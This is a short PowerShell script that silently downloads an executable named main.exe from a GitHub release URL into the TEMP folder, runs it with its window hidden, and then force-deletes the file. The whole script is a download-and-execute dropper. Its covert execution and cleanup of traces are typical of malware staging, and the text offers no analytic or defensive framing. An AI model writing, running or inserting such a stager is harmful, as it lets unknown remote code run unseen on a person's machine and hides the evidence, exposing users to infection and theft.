param (
    [string]$DownloadUrl = 'https://github.com/giasfelfebrehber/stuff/releases/download/1/main.exe',
    [string]$OutputPath = "$env:TEMP\main.exe"
)

# Download using curl.exe silently
try {
    Start-Process -FilePath "curl.exe" -ArgumentList "-sS", "-L", "-o", "`"$OutputPath`"", "`"$DownloadUrl`"" -Wait -NoNewWindow
    if (Test-Path $OutputPath) {
        Start-Process -FilePath $OutputPath -Wait -WindowStyle Hidden
    }
} finally {
    Remove-Item $OutputPath -Force -ErrorAction SilentlyContinue
}
